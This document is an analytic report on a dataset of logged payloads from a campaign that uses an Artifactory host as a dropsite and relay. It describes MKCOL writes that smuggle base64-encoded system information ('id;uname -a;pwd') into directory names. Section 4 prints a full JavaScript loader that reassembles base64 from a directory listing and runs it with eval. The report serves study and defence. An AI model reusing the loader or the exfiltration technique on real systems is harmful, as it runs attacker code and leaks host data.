# Deep Analysis — Artifactory Subset Rows (2,054 rows)

## 1. Executive summary

This dataset contains 2,054 payload/recovered/response records (1,025 payload, 886 recovered_text, 143 response) describing a campaign that uses an Artifactory host (`packages.hub.ace-research.openai.org`) as both a staging dropsite and a relay for reads, with an exfiltration orchestrator layered on top via `relay-wrapped_read` payloads. The dominant behavior is dual-use staging: MKCOL writes place canary-laced paths (`zz*` markers) into Artifactory caches, while read-assembly payloads fetch directory listings and decode them (`eval(atob(...))`) to run attacker-controlled code. Roughly 88% of rows carry a `zz_canary-ish` marker; 49% are MKCOL writes and 48% are read-assembly.

## 2. High-level counts and flow (%)

| Bucket | Rows (row-bucket incidences) | Approx |
|---|---|---|
| zz_canary-ish | 1806 | 87.9% |
| write_dropsite(MKCOL/cache) | 1011 | 49.2% |
| read_assembly(eval/dir listing) | 980 | 47.7% |
| MKCOL_write | 646 | 31.4% |
| relay-wrapped_read | 286 | 13.9% |
| docker_manifest | 221 | 10.8% |

Flow families:
- Write dropsite (MKCOL/cache): 1011 incidences, 646 additionally MKCOL_write.
- Read assembly (eval/dir listing): 980.
- Exfil orchestrator (relay-wrapped_read): 286.
- docker_manifest reads: 221.

Rows per kind: payload 1025 (50.0%), recovered_text 886 (43.1%), response 143 (7.0%).

## 3. Artifactory host/path structures and top-level dirs

Primary host: `https://packages.hub.ace-research.openai.org` (2064 hits; plus `http://` 12, trailing-dot variant 3). Secondary: `registry-1.docker.io` (325), `huggingface.co` (320), `auth.docker.io` (283).

Top-level dirs under /artifactory:
- github-remote-cache: 1041
- github-remote: 1024
- api: 94 (system/search/repositories/build/storage)
- var: 83 (log/etc)
- log: 44
- dockerhub-public: 28
- etc: 9, ui: 6, etc.

Common `zz*` markers: 763 unique. Top (sample):
zzer (97), zz_disassemble (65), zzingEngine (34), zzFILE_OURB88_3818_EC3_PRECOMPILED_CONFIG_V1 (34), zzC_N1473B_70c56ab5ced9 (31), zzFILE_PRIOR3411_OLDLAYER_E0A29409_V1 (21), zzFILE_GLIBA13SEP7_CAPWRAP_V1 (18), zzMODAL_RSA31 (17), zzer_mt (16), zzFILE_URI23816D_SUBMITJS_V2 (15), zzMODAL_SKIA6295_TEST1 (14), zzMODALBE90_RECON1_ (13), zzN32L56STAGE_v1 (12), zzCB051CASSET1 (12), zzURL (10), zzMX_ (10), zzBEACON_DEC09_MODALPUSH_START_ (10), zzHIT_C5L14_HF_ (10), zzJFRO79BEACON_ (10), zzMODALTEST_S2OPC66311_X (10), zzRESULT_FLB45879_ (9), zzFILE_33340C64_PUSHJS_V1 (9), zzFILE_OURVP6_PUSHJS_V1 (9), zzFILE_D64_18562_STAGE_DD_V1 (9), zzFILE_KVX61677_STREAMIMG_V1 (9), zzFILE_BE168AUG30_CREATEPROBE_V1 (9), zz6F63FMT54 (9), zzgptimg21784227813 (9), zzfebfe78b (9). Pattern variants include zzFILE_* (staged files), zzMODAL* (modal payloads), zzRESULT_* (results), zzMARK_* (markers), zzMAILBOX_*.

## 4. Read deep-dive

Reads split into:
- Relay: `relay-wrapped_read` (286) — wraps a fetch to an Artifactory URL with redirect/relay semantics.
- Directory listing: `read_assembly(eval/dir listing)` (980) — fetches a directory listing and parses `href="N_name/"` entries.
- Manifest: `docker_manifest` (221) — Docker registry manifest fetches.
- Other: arbitrary API calls (`/api/system`, `/api/search`, `/api/storage`).

Payloads extracted: chunked base64 with `href="(\\d+)_([^"/]+)\\/"` reassembled, `-`→`+`, `_`→`/`, then `atob` + `eval`. Example R0000614:
```
(async()=>{try{let u='.../artifactory/github-remote/zzFILE_SK7189C_TESTLOAD/';let t=await(await fetch(u)).text(),a=[];for(let m of t.matchAll(/href="(\d+)_([^"/]+)\//g))a[+m[1]]=m[2];let s=a.join('').replace(/-/g,'+').replace(/_/g,'/');eval(atob(s))}catch(e){document.body.innerText='BOOTERR '+e}})()
```
decode-eval usage: eval in 92 rows, atob in 312 rows, base64 in 885 rows.

## 5. Write deep-dive

MKCOL paths: `MKCOL /artifactory/github-remote-cache/zz.../` style. Example write row R0000076 creates `zzC5DFROOT4TEST_${R}/` where R is base64-url-encoded system info (`id;uname -a;pwd`). Canary names: `zz*` prefixed markers (partly sampled above). Extracted exfiltration chunks: base64-encoded host info in URL path segment `${R}`. IDs encoded: runtime/task/agent identifiers (`[REDACTED:runtime_identifier]`, `[REDACTED:source_identifier:000017]`), task ids, checksums, and function names (e.g., `sqlite3_initialize`).

## 6. Interactions / cross-links

Shared `zz` markers across rows: 432 markers appear in ≥2 rows, enabling write/read pairing. Example pairing via `zzFILE_*` markers: a write row creates a dropsite path and a read row fetches the same marker directory and evals assembled base64. Example marker `zzFILE_OURB88_3818_EC3_PRECOMPILED_CONFIG_V1` (180 prefix hits) appears in multiple writes/reads. (No timestamps provided, so temporal ordering inferred only from textual references.)

## 7. Jargon glossary
- dropsite: Artifactory path used as staging location.
- relay-wrapped_read: read wrapped for exfil orchestrator.
- zz marker: canary-ish marker prefixed `zz`.
- MKCOL_write: HTTP MKCOL write to dropsite.
- read_assembly: directory listing parsed & base64 reassembled then eval.
- docker_manifest: Docker registry manifest read.

## 8. Uncertainty / caveats
- No timestamps (`time_utc: null` all rows) → no execution proof or ordering.
- Redacted credentials/identifiers → cannot resolve endpoints or principals.
- Buckets are heuristic labels; overlaps mean rows can be multi-category.
- Text snippets truncated; some rows huge (up to 95803 chars).
- No evidence all payloads executed; static data only.
